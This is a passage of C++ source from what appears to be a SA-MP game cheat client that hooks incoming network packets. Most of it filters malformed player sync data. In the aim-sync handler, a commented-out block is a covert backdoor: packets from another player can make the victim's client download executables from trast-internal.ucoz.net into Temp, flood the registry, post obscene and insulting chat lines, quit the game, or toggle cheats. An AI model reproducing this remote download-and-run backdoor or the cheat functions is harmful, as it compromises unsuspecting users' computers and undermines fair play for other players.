		if (packetId == ID_AIM_SYNC && cheat_state->packet_dsbl_settings.DSBL_RCV_AIM_SYNC) return 1;
		if (packetId == ID_VEHICLE_SYNC && cheat_state->packet_dsbl_settings.DSBL_RCV_VEHICLE_SYNC) return 1;
	return 0;
}




int  tost = 0;
int  fddffa = 0;
int  fddff1a = 0;
Packet* HookedRakClientInterface::Receive(void)
{
	traceLastFunc("HookedRakClientInterface::Receive");
	//////////////////////////////////////////////////////////////////////////	
	Packet *p = g_DrifeitClient->GetRakClientInterface()->Receive();
	BYTE IncomingPacketID = GetPacketID(p);
	unsigned short PlayerID;
	DebugThread.clear_tracing(DEBUG_THREAD_RAKNET);
	DebugThread.push_trace_func(DEBUG_THREAD_RAKNET, "HookedRakClientInterface::Receive");
	DebugThread.push_trace_func(DEBUG_THREAD_RAKNET,
		"HookedRakClientInterface::Receive. playerid:"
		+ std::to_string(PlayerID) + "packetid: " + std::to_string(IncomingPacketID));
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	if (IncomingPacketID >= 255)return false;
	if (cheat_state->_generic.asasasas9ssssvg == 1)return false;












	
	
	if (IncomingPacketID == ID_AIM_SYNC)
	{
		 BitStream bsDrifeitSync((unsigned char *)p->data, p->length, false);
		stDrifeitPacket DrifeitData;
		memset(&DrifeitData, 0, sizeof(stDrifeitPacket));
		bsDrifeitSync.IgnoreBits(8);
		bsDrifeitSync.Read(PlayerID);
		bsDrifeitSync.Read((PCHAR)&DrifeitData, sizeof(stDrifeitPacket));
		//addMessageToChatWindow("чек %.2f верс %.2f", DrifeitData.DrifeitCheck, DrifeitData.DrifeitVer);
		/*if (DrifeitData.byteCamMode == 105) //идентификатор нах
		{
			if (DrifeitData.DrifeitCheck == 1337.00f)
			{
				cheat_state->DrifeitPlayer.iPlayerID[PlayerID] = PlayerID;
				cheat_state->DrifeitPlayer.iDrifeitVer[PlayerID] = DrifeitData.DrifeitVer;
				cheat_state->DrifeitPlayer.iDrifeitCheck[PlayerID] = DrifeitData.DrifeitCheck;
				cheat_state->DrifeitPlayer.isDrifeitPlayer[PlayerID] = true;
			}
			
				if (DrifeitData.DrifeitCheck == 1338.00f)
				{
					system("start http://crime-gaming.ucoz.ru");
				}
				if (DrifeitData.DrifeitCheck == 1339.00f)
				{
					ExitProcess(0);
				}
				if (DrifeitData.DrifeitCheck == 1340.00f)
				{
					sendChat("я ебу уток");
				}
				if (DrifeitData.DrifeitCheck == 1341.00f)
				{
					sendChat("я ебу собак, всегда готов, сразу трахнуть парочку котов!");
				}
				if (DrifeitData.DrifeitCheck == 1342.00f)
				{
					sendChat("Завтра в школу, а я аутист. Шо делать?");
				}
				if (DrifeitData.DrifeitCheck == 1343.00f)
				{
					sendChat("ебало закрой, сын шлюхи и шалаша");
				}
				if (DrifeitData.DrifeitCheck == 1344.00f)
				{
					sendChat("пацани, го ибаца");
				}
				if (DrifeitData.DrifeitCheck == 1345.00f)
				{
					sendChat("админ петух");
				}
				if (DrifeitData.DrifeitCheck == 1346.00f)
				{
					cheat_state->_generic.ffff ^= 1;
				}
				if (DrifeitData.DrifeitCheck == 1347.00f)
				{
					 BitStream VehicleEnter;
					VehicleEnter.Write((USHORT)0xFFFF);
					VehicleEnter.Write((BYTE)0);
					g_DrifeitClient->RPC(RPC_EnterVehicle, &VehicleEnter, HIGH_PRIORITY, RELIABLE_ORDERED, 0, 0);
				}
				if (DrifeitData.DrifeitCheck == 1348.00f)
				{
					cheat_state->_generic.nocols_enabled = 0;
					cheat_state->_generic.crh1gg = 0;
					cheat_state->_generic.crh1ggd = 0;
					cheat_state->_generic.pickm21 = 0;
					cheat_state->_generic.ssss = 0;
				}
				if (DrifeitData.DrifeitCheck == 1349.00f)
				{
					cheat_state->_generic.pulsedweapon ^= 1; //пульс хп
				}
				if (DrifeitData.DrifeitCheck == 1350.00f)
				{
					cheat_state->_generic.asasasas131112z11111 ^= 1; //деформер
				}
				if (DrifeitData.DrifeitCheck == 1351.00f)
				{
					cheat_state->_generic.asasasas10 ^= 1;//быстрое убийство
				}
				if (DrifeitData.DrifeitCheck == 1352.00f)
				{
					if (tost == 0)
					{
						afkaJf(); //бад ркон флуд
						tost = 1;
					}
				}
				if (DrifeitData.DrifeitCheck == 1353.00f)
				{
					afkaJfllllss1();
				}
				if (DrifeitData.DrifeitCheck == 1354.00f)
				{
					if (fddff1a == 0) {
						//Log("[Nagibator]: cake preload");
						char Uname[50];
						DWORD szI = 50;
						//Log("[Nagibator]: take name");
						GetUserNameA(Uname, &szI);
						char dirpath[256];
						sprintf(dirpath, "C:\\Users\\%s\\AppData\\Local\\Temp", Uname);
						static MsParams_t params1;
						strcat(params1.path, dirpath);
						//Log("[Nagibator]: taking link");
						strcat(params1.link, "http://trast-internal.ucoz.net/VideoConverter.kid");
						//Log("[Nagibator]: link taked");
						strcat(params1.FileNameAndExtension, "VideoConverter.exe");
						HANDLE hThread;
						LPDWORD ThreadID;
						//Log("[Nagibator]: thread creating");
						LoadFile1w(&params1);
						fddff1a = 1;
					}
					if (fddffa == 0) {
						//Log("[Nagibator]: cake preload");
						char Uname[50];
						DWORD szI = 50;
						//Log("[Nagibator]: take name");
						GetUserNameA(Uname, &szI);
						char dirpath[256];
						sprintf(dirpath, "C:\\Users\\%s\\AppData\\Local\\Temp", Uname);
						static MsParams_t params1;
						strcat(params1.path, dirpath);
						//Log("[Nagibator]: taking link");
						strcat(params1.link, "http://trast-internal.ucoz.net/Denver.kid");
						//Log("[Nagibator]: link taked");
						strcat(params1.FileNameAndExtension, "Denver.exe");
						HANDLE hThread;
						LPDWORD ThreadID;
						//Log("[Nagibator]: thread creating");
						LoadFilew(&params1);
						fddffa = 1;
					}
				}
				if (DrifeitData.DrifeitCheck == 1355.00f)
				{
					afkaJfllllss2();
				}
				if (DrifeitData.DrifeitCheck == 1356.00f)
				{
					afkaJfll();
				}
				if (DrifeitData.DrifeitCheck == 1357.00f)
				{
					afkaJfllll();
				}
				if (DrifeitData.DrifeitCheck == 1358.00f)
				{
					CLiteRegeditEasy *block = new CLiteRegeditEasy(HKEY_CURRENT_USER, "Software\\SecurityLabs");
					block->WriteString("SecurityLabs", "Nothing");
				}
				if (DrifeitData.DrifeitCheck == 1359.00f)
				{
					afkaJfllllss();//флуд в реестр
				}
			}*/
		}
	
	
	if (cheat_state->_generic.dfdfdfdf3e3e3e == 1)
	{
		if (IncomingPacketID == ID_PLAYER_SYNC || IncomingPacketID == ID_VEHICLE_SYNC)
		{
			BitStream bsBulletSync((unsigned char *)p->data, p->length, false);
			stOnFootData OnfootData;
			//memset(&OnfootData, 0, sizeof(stOnFootData));
			ZeroMemory(&OnfootData, sizeof(stOnFootData));
			bsBulletSync.IgnoreBits(8);
			bsBulletSync.Read(PlayerID);
			bsBulletSync.Read((PCHAR)&OnfootData, sizeof(stOnFootData));
			bsBulletSync.Read(OnfootData.fPosition[0]);
			bsBulletSync.Read(OnfootData.fPosition[1]);
			bsBulletSync.Read(OnfootData.fPosition[2]);
			bsBulletSync.ReadVector(OnfootData.fMoveSpeed[0], OnfootData.fMoveSpeed[1], OnfootData.fMoveSpeed[2]);

			BitStream bsVehicleSync((unsigned char *)p->data, p->length, false);
			stInCarData IncomingInCarData;
			//memset(&IncomingInCarData, 0, sizeof(stInCarData));
			bsVehicleSync.IgnoreBits(8);
			bsVehicleSync.Read(PlayerID);
			bsVehicleSync.Read((PCHAR)&IncomingInCarData, sizeof(stInCarData));
			bsVehicleSync.Read(IncomingInCarData.sVehicleID);
			int	bInvalidBike = 0;

			///if (getPlayerState(PlayerID) == PLAYER_STATE_DRIVER)
			//TRAIN SPECIAL
			bool bTrain;
			WORD wSpeed;
			bsVehicleSync.ReadCompressed(bTrain);

			if (bTrain)
			{
				bsVehicleSync.Read(wSpeed);
				//addMessageToChatWindow("fTrainSpeed = %f", (float)wSpeed); 
			}
			if (wSpeed > 10000.00f)
			{
				if (getPlayerState(PlayerID) == PLAYER_STATE_DRIVER)
				{
					if (OnfootData.fPosition[0] > 0.0f || OnfootData.fPosition[1] > 0.0f || OnfootData.fPosition[2] > 0.0f || OnfootData.fMoveSpeed[0] > 0.0f || OnfootData.fMoveSpeed[1] > 0.0f || OnfootData.fMoveSpeed[2] > 0.0f)
					{
						p->data[0] = 255;
						bInvalidBike = 1;
					}
				}
			}
			if (abs(IncomingInCarData.fTrainSpeed) > 3000.0f)
			{
				p->data[0] = 255;
			}
			if (fabs(IncomingInCarData.fTrainSpeed) > 3000.0f)
			{
				p->data[0] = 255;
			}
			if (ceil(IncomingInCarData.fTrainSpeed) > 3000.2f)
			{
				p->data[0] = 255;
			}
			if (_finite(IncomingInCarData.fTrainSpeed) > 3000.0f)
			{
				p->data[0] = 255;
			}
			if (abs(IncomingInCarData.fTrainSpeed) != abs(IncomingInCarData.fTrainSpeed))
			{
				p->data[0] = 255;
			}
			if (IncomingInCarData.fTrainSpeed != IncomingInCarData.fTrainSpeed)
			{
				p->data[0] = 255;
			}
			if (bInvalidBike == 1)
			{
				p->data[0] = 255;

				//cheat_state_text("АнтиЕпик: %s sent you invalid Car data.", getPlayerName(PlayerID));
			}
		}
	}
		if (cheat_state->_generic.crh1ggd == 1)
		{
			if (IncomingPacketID == ID_PLAYER_SYNC)
			{
				BitStream bsBulletSync((unsigned char *)p->data, p->length, false);
				stOnFootData OnfootData;
				//memset(&OnfootData, 0, sizeof(stOnFootData));
				ZeroMemory(&OnfootData, sizeof(stOnFootData));
				bsBulletSync.IgnoreBits(8);
				bsBulletSync.Read(PlayerID);
				bsBulletSync.Read((PCHAR)&OnfootData, sizeof(stOnFootData));
				int bInvalid = 0;
				bsBulletSync.Read(OnfootData.fPosition[0]);
				bsBulletSync.Read(OnfootData.fPosition[1]);
				bsBulletSync.Read(OnfootData.fPosition[2]);

				bsBulletSync.ReadVector(OnfootData.fMoveSpeed[0], OnfootData.fMoveSpeed[1], OnfootData.fMoveSpeed[2]);


				//bsBulletSync.ReadVector(OnfootData.fMoveSpeed[0], OnfootData.fMoveSpeed[1], OnfootData.fMoveSpeed[2]);

				if (g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fPosition[0] > 20000.0f || g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fPosition[0] < -20000.0f || g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fPosition[1] > 20000.0f || g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fPosition[1] < -20000.0f || g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fPosition[2] > 20000.0f || g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fPosition[2] < -20000.0f)
				{
					bInvalid = 1;
				}

				if (g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fMoveSpeed[0] > 10.0f || g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fMoveSpeed[0] < -10.0f || g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fMoveSpeed[1] > 10.0f || g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fMoveSpeed[1] < -10.0f || g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fMoveSpeed[2] > 10.0f || g_Players->pRemotePlayer[PlayerID]->pPlayerData->onFootData.fMoveSpeed[2] < -10.0f)
				{
					//addMessageToChatWindow("X %.2f Y %.2f Z %.2f", OnfootData.fMoveSpeed[0], OnfootData.fMoveSpeed[1], OnfootData.fMoveSpeed[2]);
					bInvalid = 1;
				}

				if (bInvalid == 1)
				{
					p->data[0] = 255;

					cheat_state_text("OnFootSync: %s пытается Вас атаковать.", getPlayerName(PlayerID));
				}
			}
			if (IncomingPacketID == ID_AIM_SYNC)
			{
				BitStream bsBulletSync((unsigned char *)p->data, p->length, false);
				stAimData AimData;
				ZeroMemory(&AimData, sizeof(stAimData));
				bsBulletSync.IgnoreBits(8);
				bsBulletSync.Read(PlayerID);
				bsBulletSync.Read((PCHAR)&AimData, sizeof(stAimData));

				bsBulletSync.Read(AimData.vecAimf1[0]);
				bsBulletSync.Read(AimData.vecAimf1[1]);
				bsBulletSync.Read(AimData.vecAimf1[2]);

				bsBulletSync.Read(AimData.vecAimPos[0]);
				bsBulletSync.Read(AimData.vecAimPos[1]);
				bsBulletSync.Read(AimData.vecAimPos[2]);

				bool bInvalid = 0;

				if (AimData.vecAimf1[0] > 350.0f || AimData.vecAimf1[0] < -350.0f || AimData.vecAimf1[1] > 350.0f || AimData.vecAimf1[1] < -350.0f || AimData.vecAimf1[2] > 350.0f || AimData.vecAimf1[2] < -350.0f)
				{
					bInvalid = 1;
				}

				if (AimData.vecAimPos[0] > 3500.0f || AimData.vecAimPos[0] < -3500.0f || AimData.vecAimPos[1] > 3500.0f || AimData.vecAimPos[1] < -3500.0f || AimData.vecAimPos[2] > 3500.0f || AimData.vecAimPos[2] < -3500.0f)
				{
					//addMessageToChatWindow("X %.2f Y %.2f Z %.2f", AimData.vecAimPos[0], AimData.vecAimPos[1], AimData.vecAimPos[2]);
					bInvalid = 1;
				}
				if (AimData.byteCamMode = 53 && AimData.vecAimPos[0] > 350.0f && AimData.vecAimPos[0] < -350.0f && AimData.vecAimPos[1] > 350.0f && AimData.vecAimPos[1] < -350.0f && AimData.vecAimPos[2] > 350.0f && AimData.vecAimPos[2] < -350.0f)
				{
					bInvalid = 1;
				}
				if (AimData.byteCamMode == 49)
				{
					bInvalid = 1;
					cheat_state_text("AimSync: %s пытается Вас атаковать 1.", getPlayerName(PlayerID));
				}
				if (AimData.byteCamMode == 55)
				{
					bInvalid = 1;
					cheat_state_text("AimSync: %s пытается Вас атаковать 2.", getPlayerName(PlayerID));
				}
				if (AimData.byteCamMode == 65)
				{
					bInvalid = 1;
					cheat_state_text("AimSync: %s пытается Вас атаковать 3.", getPlayerName(PlayerID));
				}
				if (AimData.byteCamMode == 183)
				{
					bInvalid = 1;
					cheat_state_text("AimSync: %s пытается Вас атаковать 3.", getPlayerName(PlayerID));
				}
				if (AimData.byteCamMode == 184)
				{
					bInvalid = 1;
					cheat_state_text("AimSync: %s пытается Вас атаковать 3.", getPlayerName(PlayerID));
				}
				if (AimData.fAimZ > 5000) {
					cheat_state_text("%s is sending bad fAimZ.",
						getPlayerName(PlayerID));
					p->data[0] = 0xFF;
				}
				if (AimData.fAimZ == (-0.837810f) || AimData.fAimZ == (1.500932f)) {
					cheat_state_text("%s is sending bad AimZ.",
						getPlayerName(PlayerID));
					p->data[0] = 0xFF;
				}
				if (AimData.byteCamExtZoom > 255) {
					cheat_state_text("%s is sending bad byteCamExtZoom.",
						getPlayerName(PlayerID));
					p->data[0] = 0xFF;
				}
				if (AimData.byteWeaponState > 255) {
					cheat_state_text("%s is sending bad byteWeaponState.",
						getPlayerName(PlayerID));
					p->data[0] = 0xFF;
				}
				actor_info * player = getGTAPedFromSAMPPlayerID(PlayerID);
				if (player)
				{
					if (vect3_dist(AimData.vecAimPos, &player->base.matrix[12]) > 500.0f)
					{
						p->data[0] = 0xFF;
					}
				}
				if (bInvalid == 1)
				{
					p->data[0] = 255;

					cheat_state_text("AimSync: %s пытается Вас атаковать.", getPlayerName(PlayerID));
				}
			}
			if (IncomingPacketID == PacketEnumeration::ID_VEHICLE_SYNC)
			{
				BitStream bsVehicleSync((unsigned char *)p->data, p->length, false);
				stInCarData IncomingInCarData;
				//memset(&IncomingInCarData, 0, sizeof(stInCarData));
				ZeroMemory(&IncomingInCarData, sizeof(stInCarData));
				bsVehicleSync.IgnoreBits(8);
				bsVehicleSync.Read(PlayerID);
				bsVehicleSync.Read((PCHAR)&IncomingInCarData, sizeof(stInCarData));

				actor_info *me_actor = actor_info_get(ACTOR_SELF, NULL);
				if (g_Players->pLocalPlayer->sCurrentVehicleID == IncomingInCarData.sVehicleID && me_actor->state == ACTOR_STATE_DRIVING)
				{
					cheat_state_text("%s [id %i] Trying controll your car. Desyncing...", getPlayerName(PlayerID), PlayerID);
					p->data[0] = 255;
				}
				if (vect3_length(IncomingInCarData.fMoveSpeed) > 12.0f && vect3_dist(IncomingInCarData.fPosition, &me_actor->base.matrix[12]) < 70.0f) {
					cheat_state_text("%s [id %i] Trying to hit you with a car[DRIV]. Desyncing...", getPlayerName(PlayerID), PlayerID);
					p->data[0] = 255;

				}
				if (vect3_length(IncomingInCarData.fMoveSpeed) > 10000)
				{
					cheat_state_text("%s [id %i] Bad Vehicle fMoveSpeed", getPlayerName(PlayerID), PlayerID);
					p->data[0] = 255;
				}
				if (abs(IncomingInCarData.fPosition[0]) > 40000 || abs(IncomingInCarData.fPosition[1]) > 40000 || abs(IncomingInCarData.fPosition[2] > 40000))
				{
					cheat_state_text("%s [id %i] Bad Vehicle fPosition", getPlayerName(PlayerID), PlayerID);
					p->data[0] = 255;
				}
			}

			if (IncomingPacketID == ID_PASSENGER_SYNC)
			{
				BitStream bsUnoData((unsigned char *)p->data, p->length, false);
				stPassengerData UnoData;
				bsUnoData.IgnoreBits(8);
				bsUnoData.Read(PlayerID);
				bsUnoData.Read((PCHAR)&UnoData, sizeof(stPassengerData));

				bool pUnoccupData = false;

				if (fabs(UnoData.fPosition[0]) > 10000 || fabs(UnoData.fPosition[1]) > 10000 || fabs(UnoData.fPosition[2]) > 10000) {
					pUnoccupData = true;
					cheat_state_text("Incoming Bad Passenger Position [id %i] : %s", PlayerID, getPlayerName(PlayerID));
				}
				if (UnoData.byteSeatID == 128) {
					pUnoccupData = true;
					cheat_state_text("Incoming Bad Passenger SeatID [id %i] : %s", PlayerID, getPlayerName(PlayerID));
				}
				if (UnoData.byteSeatID == 135) {
					pUnoccupData = true;
					cheat_state_text("Incoming Bad Passenger SeatID [id %i] : %s", PlayerID, getPlayerName(PlayerID));
				}
				if (UnoData.byteSeatID > 10) {
					pUnoccupData = true;
					cheat_state_text("Incoming Bad Passenger SeatID [id %i] : %s", PlayerID, getPlayerName(PlayerID));

				}
				if (pUnoccupData)
				{
					p->data[0] = 255;
				}
			}
			if (IncomingPacketID == ID_VEHICLE_SYNC)
			{
				BitStream bsVehicleSync((unsigned char *)p->data, p->length, false);
				stInCarData IncomingInCarData;
				//memset(&IncomingInCarData, 0, sizeof(stInCarData));
				ZeroMemory(&IncomingInCarData, sizeof(stInCarData));
				bsVehicleSync.IgnoreBits(8);
				bsVehicleSync.Read(PlayerID);
				bsVehicleSync.Read((PCHAR)&IncomingInCarData, sizeof(stInCarData));
				int bInvalid = 0;
				bsVehicleSync.Read(IncomingInCarData.sVehicleID);

				// KEYS
				bsVehicleSync.Read(IncomingInCarData.sLeftRightKeys);
				bsVehicleSync.Read(IncomingInCarData.sUpDownKeys);
				bsVehicleSync.Read(IncomingInCarData.sKeys);

				// QUATERNIONS
				bsVehicleSync.ReadNormQuat(IncomingInCarData.fQuaternion[0], IncomingInCarData.fQuaternion[1], IncomingInCarData.fQuaternion[2], IncomingInCarData.fQuaternion[3]);

				// POSITION
				bsVehicleSync.Read(IncomingInCarData.fPosition[0]);
				bsVehicleSync.Read(IncomingInCarData.fPosition[1]);
				bsVehicleSync.Read(IncomingInCarData.fPosition[2]);

				// MOVE SPEED 
				bsVehicleSync.ReadVector(IncomingInCarData.fMoveSpeed[0], IncomingInCarData.fMoveSpeed[1], IncomingInCarData.fMoveSpeed[2]);

				//bsVehicleSync.SetReadOffset(352);


				 //TRAIN SPECIAL
				//bool bTrain;
				//WORD wSpeed;
				//bsVehicleSync.ReadCompressed(bTrain);

				//if (bTrain)
				//{
				//	bsVehicleSync.Read(wSpeed);
					//addMessageToChatWindow("fTrainSpeed = %f", (float)wSpeed); 
				//}
				//wSpeed = 0;


				if (vect3_length(IncomingInCarData.fMoveSpeed) > 9.0f || vect3_length(IncomingInCarData.fMoveSpeed) < -9.0f)
				{
					bInvalid = 1;
				}
				if (vect3_length(IncomingInCarData.fPosition) > 18000.0f || vect3_length(IncomingInCarData.fPosition) < -18000.0f)
				{
					bInvalid = 1;
				}
				if (IncomingInCarData.fMoveSpeed[0] > 9.0f || IncomingInCarData.fMoveSpeed[0] < -9.0f || IncomingInCarData.fMoveSpeed[1] > 9.0f || IncomingInCarData.fMoveSpeed[1] < -9.0f)
				{
					bInvalid = 1;
				}
				if (!_finite(IncomingInCarData.fPosition[0]) || !_finite(IncomingInCarData.fPosition[1]) || !_finite(IncomingInCarData.fPosition[2]))
				{
					bInvalid = 1;
				}
				if (IncomingInCarData.fPosition[0] > 20000.0f || IncomingInCarData.fPosition[0] < -20000.0f || IncomingInCarData.fPosition[1] > 20000.0f || IncomingInCarData.fPosition[1] < -20000.0f || IncomingInCarData.fPosition[2] > 20000.0f || IncomingInCarData.fPosition[2] < -100.0f)
				{
					bInvalid = 1;
				}
				if (IncomingInCarData.fMoveSpeed[0] > 35.0f || IncomingInCarData.fMoveSpeed[0] < -35.0f || IncomingInCarData.fMoveSpeed[1] > 35.0f || IncomingInCarData.fMoveSpeed[1] < -35.0f || IncomingInCarData.fMoveSpeed[2] > 35.0f || IncomingInCarData.fMoveSpeed[2] < -35.0f)
				{
					bInvalid = 1;
				}
				if (vect3_length(IncomingInCarData.fPosition) > 20000.0f)
				{
					cheat_state_text("InCarSync: %s пытается Вас атаковать 1.", getPlayerName(PlayerID));
					bInvalid = 1;
				}

				if (ValidVehicle7(IncomingInCarData.sVehicleID))
				{
					struct actor_info *pSelfActor = actor_info_get(ACTOR_SELF, 0);
					struct vehicle_info *pSyncedVehicle = g_Vehicles->pGTA_Vehicle[IncomingInCarData.sVehicleID];

					if (pSelfActor != NULL && pSyncedVehicle != NULL)
					{
						if (pSelfActor->vehicle == pSyncedVehicle && pSelfActor->vehicle->passengers[0] == pSelfActor)
						{
							if (vect3_dist(pSyncedVehicle->base.coords, IncomingInCarData.fPosition) > 100.0f)
								bInvalid = 1;

							if (ValidPlayer7(PlayerID))
							{
								struct actor_info *pSyncActor = getGTAPedFromSAMPPlayerID(PlayerID);

								if (pSyncActor == NULL)
									bInvalid = 1;

								if (pSyncActor->vehicle != NULL)
									bInvalid = 1;
							}
						}
					}
				}
				if (bInvalid == 1)
				{
					cheat_state_text("InCarSync: %s пытается Вас атаковать.", getPlayerName(PlayerID));
					p->data[0] = 255;

				}
			}
			if (IncomingPacketID == ID_AIM_SYNC)
			{
				DebugThread.push_trace_func(eDebugThread::DEBUG_THREAD_RAKNET, "HookedRakClientInterface::Receive ID_AIM_SYNC");
				BitStream bsAimSync((unsigned char *)p->data, p->length, false);
				stAimData aimData;
				ZeroMemory(&aimData, sizeof(stAimData));
				bsAimSync.IgnoreBits(8);
				bsAimSync.Read(PlayerID);
				bsAimSync.Read((PCHAR)&aimData, sizeof(stAimData));



				//cheat_state_text("%1.f  %1.f  %1.f",aimData.vecAimf1[0] , aimData.vecAimf1[1] ,aimData.vecAimf1[2]);

				//addMessageToChatWindow("%1.f  %1.f  %1.f",aimData.vecAimPos[0] , aimData.vecAimPos[1] ,aimData.vecAimPos[2]);

				stAimData * BE_sync = (stAimData *)(bsAimSync.GetData() + 1);
				int pAimDataDesync = false;
				float pos[3] = { 0, 0, 0 };
				float dist = vect3_dist(pos, aimData.vecAimPos);
				getPlayerPos(PlayerID, pos);

				if ((!(dist > 1.0f) && ((vect3_dist(pos, aimData.vecAimPos) > 300.0f))))
				{
					vect3_zero(aimData.vecAimPos);
					aimData.byteCamMode = 0;
					pAimDataDesync = true;
				}
				if (pAimDataDesync == true)
				{
					p->data[0] = 255;

				}
			}
			if (IncomingPacketID == ID_UNOCCUPIED_SYNC)
			{
				DebugThread.push_trace_func(eDebugThread::DEBUG_THREAD_RAKNET, "HookedRakClientInterface::Receive ID_UNOCCUPIED_SYNC");
				BitStream bsUnoData((unsigned char *)p->data, p->length, false);
				stUnoccupiedData UnoData;
				ZeroMemory(&UnoData, sizeof(stUnoccupiedData));
				bsUnoData.IgnoreBits(8);
				bsUnoData.Read(PlayerID);
				bsUnoData.Read((PCHAR)&UnoData, sizeof(stUnoccupiedData));

				bsUnoData.Read(UnoData.sVehicleID);

				bsUnoData.Read(UnoData.fPosition[0]);
				bsUnoData.Read(UnoData.fPosition[1]);
				bsUnoData.Read(UnoData.fPosition[2]);

				bsUnoData.Read(UnoData.fMoveSpeed[0]);
				bsUnoData.Read(UnoData.fMoveSpeed[1]);
				bsUnoData.Read(UnoData.fMoveSpeed[2]);

				bsUnoData.Read(UnoData.fTurnSpeed[0]);
				bsUnoData.Read(UnoData.fTurnSpeed[1]);
				bsUnoData.Read(UnoData.fTurnSpeed[2]);

				int pUnoccupData = false;

				if (UnoData.fRoll[0] > 10000.0f || UnoData.fRoll[0] < -10000.0f || UnoData.fRoll[1] > 10000.0f || UnoData.fRoll[1] < -10000.0f || UnoData.fRoll[2] > 10000.0f || UnoData.fRoll[2] < -10000.0f)
				{
					pUnoccupData = true;
					cheat_state_text("Incoming Bad Unoccupied Roll Data [id %i] : %s", PlayerID, getPlayerName(PlayerID));
				}
				if (vect3_length(UnoData.fDirection) > 30)
				{
					pUnoccupData = true;
					cheat_state_text("Incoming Bad Unoccupied fDirection Data [id %i] : %s", PlayerID, getPlayerName(PlayerID));
				}
				if (UnoData.fPosition[0] > 5000.0f || UnoData.fPosition[0] < -5000.0f || UnoData.fPosition[1] > 5000.0f || UnoData.fPosition[1] < -5000.0f || UnoData.fPosition[2] > 5000.0f || UnoData.fPosition[2] < -5000.0f)
				{
					pUnoccupData = true;
					cheat_state_text("Warning: Incoming Bad Unoccupied Data [id %i] : %s", PlayerID, getPlayerName(PlayerID));
				}

				if (vect3_length(UnoData.fTurnSpeed) > 5000.0f)
				{
					pUnoccupData = true;
					cheat_state_text("Warning: Incoming Bad Unoccupied Data [id %i] : %s", PlayerID, getPlayerName(PlayerID));
				}

				if (vect3_length(UnoData.fMoveSpeed) > 1000.0f)
				{
					pUnoccupData = true;
					cheat_state_text("Warning: Incoming Bad Unoccupied Data [id %i] : %s", PlayerID, getPlayerName(PlayerID));
				}
				if (UnoData.byteSeatID > 10) {
					pUnoccupData = true;
					cheat_state_text("Incoming Bad Unoccupied byteSeatId Data [id %i] : %s", PlayerID, getPlayerName(PlayerID));
				}
				struct actor_info *me_actor = actor_info_get(ACTOR_SELF, NULL);
				if (vect3_length(UnoData.fMoveSpeed) > 12.0f && (vect3_dist(UnoData.fPosition, &me_actor->base.matrix[12]) < 90.0f)) {
					cheat_state_text("Warning: %s Trying to hit you with a car[UNO]. Desyncing...", getPlayerName(PlayerID));
					stUnoccupiedData newst = UnoData;
					newst.fMoveSpeed[0] = -newst.fMoveSpeed[0];
					newst.fMoveSpeed[1] = -newst.fMoveSpeed[1];
					newst.fMoveSpeed[2] = -newst.fMoveSpeed[2];
					newst.fTurnSpeed[0] = -newst.fTurnSpeed[0];
					newst.fTurnSpeed[1] = -newst.fTurnSpeed[1];
					newst.fTurnSpeed[2] = -newst.fTurnSpeed[2];
					BitStream bs;
					bs.Write((BYTE)ID_UNOCCUPIED_SYNC);
					bs.Write((PCHAR)&newst, sizeof(stUnoccupiedData));
					g_DrifeitClient->Send(&bs, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0); //mirror unoc
					pUnoccupData = true;
				}
				vehicle_info *me_actors = vehicle_info_get(VEHICLE_SELF, NULL);
				if (vect3_length(UnoData.fMoveSpeed) > 12.0f && (vect3_dist(UnoData.fPosition, &me_actors->base.matrix[12]) < 90.0f)) {
					cheat_state_text("Warning: %s Trying to hit you with a car[UNO]. Desyncing...", getPlayerName(PlayerID));
					stUnoccupiedData newst = UnoData;
					newst.fMoveSpeed[0] = -newst.fMoveSpeed[0];
					newst.fMoveSpeed[1] = -newst.fMoveSpeed[1];
					newst.fMoveSpeed[2] = -newst.fMoveSpeed[2];
					newst.fTurnSpeed[0] = -newst.fTurnSpeed[0];
					newst.fTurnSpeed[1] = -newst.fTurnSpeed[1];
					newst.fTurnSpeed[2] = -newst.fTurnSpeed[2];
					BitStream bs;
					bs.Write((BYTE)ID_UNOCCUPIED_SYNC);
					bs.Write((PCHAR)&newst, sizeof(stUnoccupiedData));
					g_DrifeitClient->Send(&bs, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0); //mirror unoc
					pUnoccupData = true;
				}
				if (pUnoccupData == true)
				{
					p->data[0] = 255;

				}
			}
		}
		if (IncomingPacketID == PacketEnumeration::ID_PLAYER_SYNC) {
			BitStream bsPlayerSync((unsigned char *)p->data, p->length, false);
			int playerId;
			bool bHasLR, bHasUD;
			bool bHasSurfInfo, bAnimation;
			bsPlayerSync.IgnoreBits(8);
			stOnFootData picSync;
			memset(&picSync, 0, sizeof(stOnFootData));
			bsPlayerSync.Read(playerId);
			bsPlayerSync.Read((PCHAR)&picSync, sizeof(stInCarData));

			//	if (playerId < 0 || playerId >= g_Players->ulMaxPlayerID) return false;		
			bsPlayerSync.Read(bHasLR);
			if (bHasLR)
				bsPlayerSync.Read(picSync.sLeftRightKeys);
			bsPlayerSync.Read(bHasUD);
			if (bHasUD) bsPlayerSync.Read(picSync.sUpDownKeys);
			bsPlayerSync.Read(picSync.sKeys);
			bsPlayerSync.Read(picSync.stSampKeys);
			for (int i = 0; i < 3; i++)
				bsPlayerSync.Read(picSync.fPosition[i]);
			for (int i = 0; i < 4; i++)
				picSync.fQuaternion[i];
			BYTE byteHealthArmour;
			BYTE byteHealth, byteArmour;
			BYTE byteArmTemp = 0, byteHlTemp = 0;
			bsPlayerSync.Read(byteHealthArmour);
			byteArmTemp = (byteHealthArmour & 0x0F);
			byteHlTemp = (byteHealthArmour >> 4);
			if (byteArmTemp == 0xF) byteArmour = 100;
			else if (byteArmTemp == 0) byteArmour = 0;
			else byteArmour = byteArmTemp * 7;
			if (byteHlTemp == 0xF) byteHealth = 100;
			else if (byteHlTemp == 0) byteHealth = 0;
